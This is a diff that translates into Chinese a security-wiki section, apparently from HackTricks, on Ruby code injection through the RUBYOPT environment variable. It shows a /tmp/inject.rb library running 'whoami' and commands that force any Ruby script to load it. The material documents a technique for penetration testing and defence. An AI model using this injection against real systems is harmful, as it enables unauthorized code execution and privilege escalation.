@@ -4,30 +4,22 @@
 
 ## RUBYOPT
 
-Using this env variable it's possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`** cannot be used to specify ruby code to execute, it's possible to use the params **`-I`** and **`-r`** to add a new folder to the libraries to load path and then **specify a library to load**.
+使用这个环境变量，可以在每次执行**ruby**时**添加新参数**。虽然参数**`-e`**不能用于指定要执行的ruby代码，但可以使用参数**`-I`**和**`-r`**来添加一个新文件夹到库加载路径，然后**指定要加载的库**。
 
-Create the library **`inject.rb`** in **`/tmp`**:
-
+在**`/tmp`**中创建库**`inject.rb`**：
 ```ruby:inject.rb
 puts `whoami`
 ```
-
-Create anywahere a ruby script like:
-
+创建一个类似于以下的 Ruby 脚本：
 ```ruby:hello.rb
 puts 'Hello, World!'
 ```
-
-Then make an arbitrary ruby script load it with:
-
+然后使用以下任意 Ruby 脚本加载它：
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb
 ```
-
-Fun fact, it works even with param **`--disable-rubyopt`**:
-
+有趣的事实，即使使用参数 **`--disable-rubyopt`** 也有效：
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
